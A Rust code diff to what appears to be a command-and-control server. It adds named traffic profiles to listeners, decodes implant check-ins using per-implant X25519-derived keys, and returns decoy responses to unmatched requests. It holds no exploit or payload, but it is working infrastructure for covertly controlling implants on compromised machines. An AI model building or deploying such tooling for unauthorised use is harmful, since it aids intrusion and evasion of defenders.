@@ -28,10 +28,12 @@ use crate::event::EventBus;
 use crate::module::ModuleRepository;
 use crate::profile::compiler::ListenerProfile;
 use crate::profile::schema::*;
-use crate::profile::{transform_decode, transform_encode};
+use crate::profile::{compile_listener_config, parse_profile, transform_decode, transform_encode};
 use crate::session::SessionManager;
 use crate::task::TaskDispatcher;
-use checkin_processor::{parse_plaintext_checkin, process_checkin, CheckinOptions, SessionBinding};
+use checkin_processor::{
+    parse_plaintext_checkin, process_checkin, CheckinOptions, ParsedCheckin, SessionBinding,
+};
 
 // ── Axum shared state ────────────────────────────────────────────────────────
 
@@ -109,11 +111,6 @@ async fn profile_handler(
         None => return decoy_handler().await.into_response(),
     };
 
-    let session_key = match &state.profile_session_key {
-        Some(k) => **k,
-        None => return decoy_handler().await.into_response(),
-    };
-
     // Validate method
     let expected_method = profile.request_template.method.to_uppercase();
     if request.method().as_str().to_uppercase() != expected_method {
@@ -156,33 +153,32 @@ async fn profile_handler(
     };
 
     // Apply reverse transform: decode → decrypt → decompress
-    let plaintext = match transform_decode(&encoded_data, &profile.transform, &session_key) {
-        Ok(pt) => pt,
-        Err(e) => {
-            tracing::warn!(
-                "profile_handler: transform decode failed for {} extracted bytes: {e}",
-                encoded_data.len()
-            );
-            return decoy_handler().await.into_response();
-        }
-    };
+    let (parsed, session_key, implant_pubkey) =
+        match decode_profile_checkin(&state, &profile, &encoded_data).await {
+            Some(decoded) => decoded,
+            None => {
+                tracing::warn!(
+                    "profile_handler: failed to decode profile check-in for {} extracted bytes",
+                    encoded_data.len()
+                );
+                return decoy_handler().await.into_response();
+            }
+        };
 
-    let parsed = match parse_plaintext_checkin(&plaintext) {
-        Some(parsed) => parsed,
-        None => {
-            tracing::warn!(
-                "profile_handler: parsed plaintext check-in failed for {} bytes",
-                plaintext.len()
-            );
-            return decoy_handler().await.into_response();
-        }
-    };
+    let binding = parsed
+        .request
+        .session_id
+        .as_ref()
+        .filter(|id| !id.is_empty())
+        .map(|id| SessionBinding::Existing(id.clone()))
+        .or_else(|| implant_pubkey.map(SessionBinding::ImplantPubkey))
+        .unwrap_or(SessionBinding::Metadata);
 
     let processed = match process_checkin(
         &state,
         parsed.request,
         parsed.is_binary,
-        SessionBinding::Metadata,
+        binding,
         CheckinOptions {
             defer_module_payloads: false,
         },
@@ -219,6 +215,79 @@ async fn profile_handler(
 
     // Format response per profile template
     format_profile_response(&encoded_resp, &profile.response_template).into_response()
+}
+
+fn try_decode_profile_checkin(
+    profile: &ListenerProfile,
+    encoded_data: &[u8],
+    session_key: &[u8; 32],
+) -> Option<ParsedCheckin> {
+    let plaintext = match transform_decode(encoded_data, &profile.transform, session_key) {
+        Ok(pt) => pt,
+        Err(e) => {
+            tracing::debug!(
+                "profile_handler: transform decode candidate failed for {} extracted bytes: {e}",
+                encoded_data.len()
+            );
+            return None;
+        }
+    };
+
+    match parse_plaintext_checkin(&plaintext) {
+        Some(parsed) => Some(parsed),
+        None => {
+            tracing::debug!(
+                "profile_handler: parsed plaintext check-in failed for {} bytes",
+                plaintext.len()
+            );
+            None
+        }
+    }
+}
+
+async fn decode_profile_checkin(
+    state: &HttpState,
+    profile: &ListenerProfile,
+    encoded_data: &[u8],
+) -> Option<(ParsedCheckin, [u8; 32], Option<[u8; 32]>)> {
+    if let Some(session_key) = &state.profile_session_key {
+        if let Some(parsed) = try_decode_profile_checkin(profile, encoded_data, session_key) {
+            return Some((parsed, **session_key, None));
+        }
+    }
+
+    let rows: Vec<(String, Vec<u8>)> = match sqlx::query_as(
+        "SELECT id, implant_pubkey FROM sessions \
+         WHERE deleted = 0 AND implant_pubkey IS NOT NULL",
+    )
+    .fetch_all(&state.pool)
+    .await
+    {
+        Ok(rows) => rows,
+        Err(e) => {
+            tracing::warn!("profile_handler: failed to list session pubkeys: {e}");
+            return None;
+        }
+    };
+
+    for (session_id, pubkey) in rows {
+        if pubkey.len() != 32 {
+            continue;
+        }
+
+        let mut implant_pubkey = [0u8; 32];
+        implant_pubkey.copy_from_slice(&pubkey);
+        let implant_pub = PublicKey::from(implant_pubkey);
+        let shared = state.server_secret.diffie_hellman(&implant_pub);
+        let session_key = hkdf_sha256_derive(shared.as_bytes(), &implant_pubkey);
+
+        if let Some(parsed) = try_decode_profile_checkin(profile, encoded_data, &session_key) {
+            tracing::debug!("profile_handler: decoded check-in with session {session_id}");
+            return Some((parsed, session_key, Some(implant_pubkey)));
+        }
+    }
+
+    None
 }
 
 /// Extract embedded data from the request based on the profile's embed points.
@@ -836,6 +905,7 @@ impl ListenerManager {
         bind_address: &str,
         port: u32,
         protocol: &str,
+        profile_name: &str,
     ) -> Result<Listener, sqlx::Error> {
         let id = uuid::Uuid::new_v4().to_string();
         let now = Utc::now().timestamp();
@@ -847,8 +917,8 @@ impl ListenerManager {
         let pubkey_bytes = pubkey.to_bytes();
 
         sqlx::query(
-            "INSERT INTO listeners (id, name, bind_address, port, protocol, status, created_at, x25519_privkey, x25519_pubkey) \
-             VALUES (?, ?, ?, ?, ?, 'STOPPED', ?, ?, ?)",
+            "INSERT INTO listeners (id, name, bind_address, port, protocol, status, created_at, profile_name, x25519_privkey, x25519_pubkey) \
+             VALUES (?, ?, ?, ?, ?, 'STOPPED', ?, ?, ?, ?)",
         )
         .bind(&id)
         .bind(name)
@@ -856,12 +926,39 @@ impl ListenerManager {
         .bind(port as i64)
         .bind(protocol)
         .bind(now)
+        .bind(profile_name.trim())
         .bind(privkey_bytes.as_slice())
         .bind(pubkey_bytes.as_slice())
         .execute(&self.pool)
         .await?;
 
         self.get_listener(&id).await
+    }
+
+    async fn load_listener_profile(
+        &self,
+        profile_name: &str,
+    ) -> Result<Option<ListenerProfile>, String> {
+        let profile_name = profile_name.trim();
+        if profile_name.is_empty() {
+            return Ok(None);
+        }
+
+        let row = sqlx::query("SELECT yaml_content FROM profiles WHERE name = ?")
+            .bind(profile_name)
+            .fetch_optional(&self.pool)
+            .await
+            .map_err(|e| format!("DB error loading listener profile '{profile_name}': {e}"))?;
+
+        let Some(row) = row else {
+            return Err(format!("Profile '{profile_name}' not found for listener"));
+        };
+
+        let yaml_content: String = row.get("yaml_content");
+        let profile = parse_profile(&yaml_content)
+            .map_err(|e| format!("Profile '{profile_name}' parse error: {e}"))?;
+
+        Ok(Some(compile_listener_config(&profile)))
     }
 
     pub async fn start_listener(&self, id: &str) -> Result<Listener, String> {
@@ -875,6 +972,7 @@ impl ListenerManager {
             .get_listener_secret(id)
             .await
             .ok_or_else(|| format!("No X25519 keypair found for listener {id}"))?;
+        let listener_profile = self.load_listener_profile(&listener.profile_name).await?;
 
         let addr = format!("{}:{}", listener.bind_address, listener.port);
         let tcp = TcpListener::bind(&addr)
@@ -888,7 +986,7 @@ impl ListenerManager {
             module_repository: None,
             server_secret: Arc::new(secret),
             server_pubkey: Arc::new(pubkey),
-            listener_profile: None,
+            listener_profile: listener_profile.map(Arc::new),
             profile_session_key: None,
             pool: self.pool.clone(),
         };
@@ -919,7 +1017,14 @@ impl ListenerManager {
             .await
             .insert(id.to_string(), ActiveListener { shutdown_tx });
 
-        tracing::info!("Listener {id} started on {addr}");
+        if listener.profile_name.is_empty() {
+            tracing::info!("Listener {id} started on {addr}");
+        } else {
+            tracing::info!(
+                "Listener {id} started on {addr} with profile {}",
+                listener.profile_name
+            );
+        }
 
         self.get_listener(id)
             .await
@@ -961,7 +1066,7 @@ impl ListenerManager {
 
     pub async fn list_listeners(&self) -> Result<Vec<Listener>, sqlx::Error> {
         let rows = sqlx::query(
-            "SELECT id, name, bind_address, port, protocol, status, created_at FROM listeners",
+            "SELECT id, name, bind_address, port, protocol, status, created_at, profile_name FROM listeners",
         )
         .fetch_all(&self.pool)
         .await?;
@@ -971,7 +1076,7 @@ impl ListenerManager {
 
     async fn get_listener(&self, id: &str) -> Result<Listener, sqlx::Error> {
         let row = sqlx::query(
-            "SELECT id, name, bind_address, port, protocol, status, created_at \
+            "SELECT id, name, bind_address, port, protocol, status, created_at, profile_name \
              FROM listeners WHERE id = ?",
         )
         .bind(id)
@@ -1003,5 +1108,6 @@ fn row_to_listener(row: &SqliteRow) -> Listener {
             seconds: created_at,
             nanos: 0,
         }),
+        profile_name: row.get("profile_name"),
     }
 }
